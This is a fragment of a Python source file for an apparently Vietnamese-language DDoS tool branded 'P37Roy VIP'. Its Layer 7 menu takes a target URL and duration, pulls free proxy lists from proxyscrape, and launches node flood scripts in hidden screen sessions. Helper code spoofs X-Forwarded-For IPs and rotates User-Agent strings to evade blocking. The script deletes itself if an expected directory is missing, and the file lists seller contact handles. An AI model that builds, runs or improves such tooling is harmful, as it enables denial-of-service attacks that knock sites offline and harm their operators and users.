 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.l4()
			elif option == 'home' or option == 'HOME':
				PBT_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.l4()
			elif option == 'hello' or option == 'HELLO':
				print(self.help)
			elif option == 'sup' or option == 'SUP':
				print(self.sup)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f P37Vip.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")

	def l7(self):
		print(f"""
   \033[1;90m██████\033[1;95m╗\033[1;90m ██████\033[1;95m╗ \033[1;90m███████\033[1;95m╗\033[1;90m██████\033[1;95m╗\033[1;90m ██████\033[1;95m╗ \033[1;90m ██████\033[1;95m╗\033[1;90m ███████\033[1;95m╗
   \033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗╚════\033[1;90m██\033[1;95m╗╚════\033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔═══\033[1;90m██\033[1;95m╗\033[1;90m██\033[1;95m╔════╝
   \033[1;90m██████\033[1;95m╔╝ \033[1;90m█████\033[1;95m╔╝    \033[1;90m██\033[1;95m╔╝\033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║ \033[1;90m ██\033[1;95m║\033[1;90m██\033[1;95m║   \033[1;90m██\033[1;95m║\033[1;90m███████\033[1;95m╗
   \033[1;90m██\033[1;95m╔═══╝  ╚═══\033[1;90m██\033[1;95m╗   \033[1;90m██\033[1;95m╔╝ \033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║  \033[1;90m██\033[1;95m║\033[1;90m██\033[1;95m║   \033[1;90m██\033[1;95m║╚════\033[1;90m██\033[1;95m║
   \033[1;90m██\033[1;95m║     \033[1;90m██████\033[1;95m╔╝   \033[1;90m██\033[1;95m║  \033[1;90m██████\033[1;95m╔╝\033[1;90m██████\033[1;95m╔╝╚\033[1;90m██████\033[1;95m╔╝\033[1;90m███████\033[1;95m║
   \033[1;95m╚═╝     ╚═════╝    ╚═╝  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                           \033[1;97m P37Roy VIP Version
\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=\033[1;91m=\033[1;97m=     """)
		print(sr+"Nhập [1] P37DDoS Method 1")
		print(sr+"Nhập [2] P37DDoS Method 2")
		print(sr+"Nhập [3] P37DDoS Method 3")
		print(sr+"Nhập [4] P37DDoS Method 4")
		print(sr+"Nhập [0] Để Quay Lại")
		print(a)
		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
		while True:
			sys.stdout.write(nm+"Nhập: ")
			option = input()
			if option == '01' or option == '1':
				try:
					url = str(input(sr+"URL: "+Color.RESET))
					floodtime = int(input(sr+"Time: "+Color.RESET))
					reqs = int(input(sr+"Request(400): "+Color.RESET))
					PBT_Tool.styleText("\n")
					with open("p37r/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node p37r/L7/method1 {url} p37r/http.txt {floodtime} {reqs}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """ ,url +" | Time: " ,floodtime)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '02' or option == '2':
				try:
					url = str(input(sr+"URL: "+Color.RESET))
					floodtime = int(input(sr+"Time: "+Color.RESET))
					PBT_Tool.styleText("\n")
					with open("p37r/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node p37r/L7/method2 GET {url} p37r/http.txt {floodtime} 64 1'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """ ,url +" | Time: " ,floodtime)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '03' or option == '3':
				try:
					url = str(input(sr+"URL: "+Color.RESET))
					floodtime = int(input(sr+"Time: "+Color.RESET))
					PBT_Tool.styleText("\n")
					with open("p37r/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node p37r/L7/method3 {url} {floodtime} 1'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """ ,url +" | Time: " ,floodtime)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == '04' or option == '4':
				try:
					url = str(input(sr+"URL: "+Color.RESET))
					floodtime = int(input(sr+"Time: "+Color.RESET))
					PBT_Tool.styleText("\n")
					with open("p37r/http.txt", 'w') as p:
						p.write(httpx.get(http_proxy).text)
					subprocess.run([f'screen -dm node p37r/L7/method4 {url} {floodtime}'], shell=True)
					print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """ ,url +" | Time: " ,floodtime)
				except:
					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
			elif option == 'ref' or option == 'REF':
				self.l7()
			elif option == 'home' or option == 'HOME':
				PBT_Tool.home()
			elif option == 'clear' or option == 'CLEAR':
				os.system('clear')
				self.l7()
			elif option == 'hello' or option == 'HELLO':
				print(self.help)
			elif option == 'sup' or option == 'SUP':
				print(self.sup)
			elif option == 'exit' or option == 'EXIT':
				subprocess.run(['pkill -f P37Vip.py'], shell=True)
			elif option == 'stop' or option == 'STOP':
				subprocess.run(['pkill screen'], shell=True)
				print("""
          _   _             _    _             
     /\  | | | |           | |  (_)            
    /  \ | |_| |_ __ _  ___| | ___ _ __   __ _ 
   / /\ \| __| __/ _` |/ __| |/ / | '_ \ / _` |
  / ____ \ |_| || (_| | (__|   <| | | | | (_| |
 /_/    \_\__|\__\__,_|\___|_|\_\_|_| |_|\__, |
                                          __/ |
                                         |___/ 
               """)
			elif option == '00' or option == '0':
				os.system('clear');self.bbos()
			elif option == "":
				pass
			else:
				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")


def spoof_useragents():
	spoof_ip = []
	ip = []
	ip1, ip2, ip3, ip4 = random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255)
	ip.append(ip1), ip.append(ip2), ip.append(ip3), ip.append(ip4)

	IP = str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."+str(ip[3])
	spoof_ip.append(IP)

	useragents = ['Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)',
	'Chrome/34.0.1847.116 Safari/537.36',
	'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']

	return {
	'Connection': 'Keep-Alive',
	'Cache-control': 'no-cache',
	'User-Agent': random.choice(useragents).strip(),
	'X-Forwarded-For': random.choice(spoof_ip)
	}

def main():
	#  checking 
	PBT_Tool.styleText(" ")
	os.system('clear')
	pkgs = ['screen', 'node']
	install = True
	for pkg in pkgs:
		ur_mom = which(pkg)
		if ur_mom == None:
			PBT_Tool.styleText(f"[!] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		sys.exit(f'\n[?] Error? try:{Color.LG} sh vdh.sh')
	else:pass
	try:
		script = True
		with open('p37r') as important:pass
	except IsADirectoryError:pass
	except FileNotFoundError:
		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'p37r' NotFound")
		print(sr+"Error! Liên hệ Zalo để được hỗ trợ!\n")
		os.remove(f'{__file__}')
		script = False
	if script == False:sys.exit()
	else:pass
	PBT_Tool.home()


if __name__ == '__main__':
	commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Back to Home
{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Làm mới trang
{Color.LC}EXIT{Color.LR} ~> {Color.LY}Thoát Tool
{Color.LC}SUP{Color.LR} ~> {Color.LY}Liên hệ support"""
	sup = f"""
\033[1;96m[Contact] Zalo: \033[1;93m0384574058
\033[1;96m[Contact] Facebook: \033[1;93mhttps://facebook.com/P37RoyKing
\033[1;96m[Contact] Telegram: \033[1;93mP37RoyKing
   """
	PBT_Tool = Home(commands, sup)
	Tool = Tool(commands, sup, spoof_useragents())
	main()
